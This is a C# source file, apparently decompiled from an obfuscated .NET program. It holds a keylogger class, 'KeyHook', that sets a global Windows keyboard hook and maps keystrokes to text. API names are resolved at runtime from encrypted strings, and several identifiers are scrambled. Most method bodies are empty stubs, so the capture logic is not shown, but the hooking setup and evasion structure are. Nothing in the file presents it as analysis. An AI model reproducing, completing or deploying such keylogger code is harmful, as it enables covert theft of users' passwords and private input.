using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using yleKZlCXnrEgcQD3gk;

internal class KeyHook
{
	private delegate int SetWindowsHookEx(int Hook, KDel KeyDelegate, int HMod, int ThreadId);

	private delegate int CallNextHookEx(int Hook, int nCode, int wParam, ref KeyStructure lParam);

	private delegate int KDel(int nCode, int wParam, ref KeyStructure lParam);

	public delegate void DownEventHandler(string Key);

	public delegate void UpEventHandler(string Key);

	private struct KeyStructure
	{
		public int Code;

		public int ScanCode;

		public int Flags;

		public int Time;

		public int ExtraInfo;

		static KeyStructure()
		{
			HIqNmi47ta6wQLwpfy.Rb22303oj();
		}
	}

	private static readonly SetWindowsHookEx SetWindowsHookExA;

	private static readonly CallNextHookEx CallNextHookExA;

	private DownEventHandler DownEvent;

	private UpEventHandler UpEvent;

	private static int Key;

	private static KDel KHD;

	public bool Alpahbet;

	public bool Digits;

	public bool SpecialSymbols;

	public event DownEventHandler Down
	{
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.Synchronized)]
		add
		{
		}
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.Synchronized)]
		remove
		{
		}
	}

	public event UpEventHandler Up
	{
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.Synchronized)]
		add
		{
		}
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.Synchronized)]
		remove
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	static KeyHook()
	{
		HIqNmi47ta6wQLwpfy.Rb22303oj();
		SetWindowsHookExA = Dynamic.CreateApi<SetWindowsHookEx>(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(308), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(312).Replace(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(76), ""));
		CallNextHookExA = Dynamic.CreateApi<CallNextHookEx>(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(308), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(316));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public KeyHook()
	{
	}

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwƝīğĻŹŔŠŨ);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uCode, uint uMapType);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int dwLayout);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int Hook);

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void CreateHook()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public Module Get_Modules(ref Assembly _Assembly)
	{
		return null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void DiposeHook()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private int Proc(int Code, int wParam, ref KeyStructure lParam)
	{
		return 0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private string Feed(Keys k)
	{
		return null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public bool Is_Locked()
	{
		return true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string Get_Ctrl()
	{
		return null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string Get_Alt()
	{
		return null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private string VKCodeToUnicode(uint V_Code)
	{
		return null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public int To_Unicode(uint A, uint B, byte[] C, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder D, int E, uint F, IntPtr G)
	{
		return 0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		return true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		return true;
	}
}
